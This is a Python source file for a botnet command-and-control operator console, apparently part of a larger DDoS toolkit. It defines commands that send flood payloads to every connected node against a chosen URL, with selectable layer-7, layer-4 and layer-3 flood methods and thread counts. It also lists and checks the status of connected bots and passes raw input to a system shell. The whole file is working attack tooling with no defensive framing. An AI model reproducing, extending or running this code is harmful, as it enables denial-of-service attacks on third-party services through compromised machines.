import socket
import threading
import json
import random
import readline
import os
import atexit
import getpass
import subprocess
from colorama import Fore, init
from .connect import C2Client

#  Command Class 
class Command:
    def __init__(self, name, func, level=1, usage=""):
        self.name = name      # Command name
        self.func = func      # Function to run
        self.level = level    # Permission level
        self.usage = usage    # Usage string

#  Payloads 
class Payloads:
    @staticmethod
    def flood(url, duration, method, threads):
        return json.dumps({
            "action": "flood",
            "data": {"url": url, "duration": duration, "method": method, "threads": threads}
        })

    @staticmethod
    def ping():
        return json.dumps({"action": "ping"})

    @staticmethod
    def status():
        return json.dumps({"action": "status"})

#  Functions to send payloads 
class Functions:
    def __init__(self, c2, shell):
        self.c2 = c2
        self.shell = shell

    def send_flood(self, url, duration=30, method="GET", threads=100):
        self.c2.send_to_all(Payloads.flood(url, duration, method, threads))

    def send_ping(self):
        self.c2.send_to_all(Payloads.ping())

    def send_status(self):
        self.c2.send_to_all(Payloads.status())

#  Commands Implementation 
class Commands:
    def __init__(self, c2, shell):
        self.c2 = c2
        self.functions = Functions(c2, shell)

    # Safe argument parser
    def parse_arg(self, args, index, default=None, cast=str):
        try:
            return cast(args[index])
        except (IndexError, ValueError, TypeError):
            return default

    # Show help
    def help(self, shell, args):
        print("\nCommands:")
        for cmd in shell.commands.values():
            print(f" {cmd.name:<10} - {cmd.usage} (level {cmd.level})")

    # Execute shell command
    def shell_exec(self, shell, args):
        subprocess.run(" ".join(args), shell=True)

    # Flood command
    def flood(self, shell, args):

        url = self.parse_arg(args, 0, default=None, cast=str)
        duration = self.parse_arg(args, 1, default=30, cast=int)
        method = self.parse_arg(args, 2, default="GET", cast=str)
        threads = self.parse_arg(args, 3, default=100, cast=int)

        if not url:
            print(f"Usage: {shell.commands['flood'].usage}")
            return

        confirm = input(f"Confirm flood {url} for {duration}s with {threads} threads? (y/n) > ").strip().lower()
        if confirm in ["y", "yes"]:
            self.functions.send_flood(url, duration, method, threads)
            print(f"Flood payload sent to all nodes: {url}\nC2:payload -> nodes:payload -> Clients:exec;ack")
        else:
            print("Cancelled")

    # Ping command
    def ping(self, shell, args):
        self.functions.send_ping()
        print("Ping sent to all nodes\nC2:payload -> node:payload -> Clients:ack")

    # nodes command
    def nodes(self, shell, args):
        if not args:
            print("Usage: nodes <list/status>")
            return

        subcmd = args[0]

        if subcmd == "list":
            nodes = self.c2.get_nodes()
            if not nodes:
                print("No nodes connected")
            else:
                print("\nConnected nodes:")
                for node_id, host, port in nodes:
                    print(f" ID: {node_id}, Address: {host}:{port}")

        elif subcmd == "status":
            self.functions.send_status()
            nodes = self.c2.get_nodes()
            if not nodes:
                print("No nodes connected")
            else:
                print("\nC2:payload -> node:ack\nnode status:")
                for node_id, host, port in nodes:
                    print(f" ID: {node_id}, Address: {host}:{port}, Status: Connected")
        else:
            print("Unknown subcommand for nodes")

    # Show methods
    def methods(self, shell, args):
        print(
            "Methods:\n"
            "L7 (App): GET, POST, PUT, DELETE, HEAD, DNS\n"
            "L4 (Transport): ACK, SYN, FIN, RST, TCP, UDP\n"
            "L3 (Network): ICMP"
        )

    # Quit shell
    def quit(self, shell, args):
        self.c2.shutdown()
        shell.running = False
        print("Exiting shell...")

#  User permissions 
users_permission_table = {
    "root": {"level": 3, "shell_color": Fore.RED},
}

#  Shell 
class Shell:
    def __init__(self, c2):
        init(autoreset=True)
        self.c2 = c2
        self.user = getpass.getuser()
        self.user_level = users_permission_table.get(self.user, {"level": 1})["level"]
        if self.user not in users_permission_table:
            users_permission_table[self.user] = {"level": 1, "shell_color": Fore.GREEN}

        self.running = True
        self.commands = {}
        self.commands_impl = Commands(c2, self)
        self._register_commands()

        # Setup readline and history
        readline.set_completer(self._complete)
        readline.parse_and_bind("tab: complete")
        history_file = os.path.expanduser("~/.shell_history")
        if os.path.exists(history_file):
            readline.read_history_file(history_file)
        readline.set_history_length(1000)
        atexit.register(readline.write_history_file, history_file)

        # Show random banner
        with open("core/banners.json", "r") as f:
            banners = json.load(f)
        print(random.choice(banners).encode('utf-8').decode('unicode_escape'))

    # Register commands
    def _register_commands(self):
        self.commands["help"] = Command("help", self.commands_impl.help, 1, "help")
        self.commands["quit"] = Command("quit", self.commands_impl.quit, 3, "quit")
        self.commands["exit"] = Command("exit", self.commands_impl.quit, 3, "exit")
        self.commands["flood"] = Command("flood", self.commands_impl.flood, 3, "flood [node_id] <url> [duration] [method] [threads]")
        self.commands["nodes"] = Command("nodes", self.commands_impl.nodes, 2, "nodes <list/ping/status>")
        self.commands["methods"] = Command("methods", self.commands_impl.methods, 1, "methods")
        self.commands["ping"] = Command("ping", self.commands_impl.ping, 2, "ping")
        self.commands["!"] = Command("!", self.commands_impl.shell_exec, 1, "! <command>")

    # Main shell loop
    def run(self):
        print("\nType 'help' for commands\n")
        while self.running:
            try:
                prompt = f"{users_permission_table[self.user]['shell_color']}{self.user}{Fore.BLUE}@botnet{Fore.RESET}\n{Fore.BLUE}${Fore.RESET}> "
                raw_input = input(prompt).strip()
                if not raw_input:
                    continue

                parts = raw_input.split()
                cmd_name, args = parts[0], parts[1:]

                if cmd_name not in self.commands:
                    print(f"Unknown command: {cmd_name}")
                    continue
                if self.user_level < self.commands[cmd_name].level:
                    print("Permission denied")
                    continue

                self.commands[cmd_name].func(self, args)

            except KeyboardInterrupt:
                print("\nInterrupted. Type 'quit' to exit")
            except Exception as e:
                print(f"Error: {e}")
            print("")

    # Tab completion
    def _complete(self, text, state):
        options = [cmd for cmd in self.commands if cmd.startswith(text)]
        return options[state] if state < len(options) else None
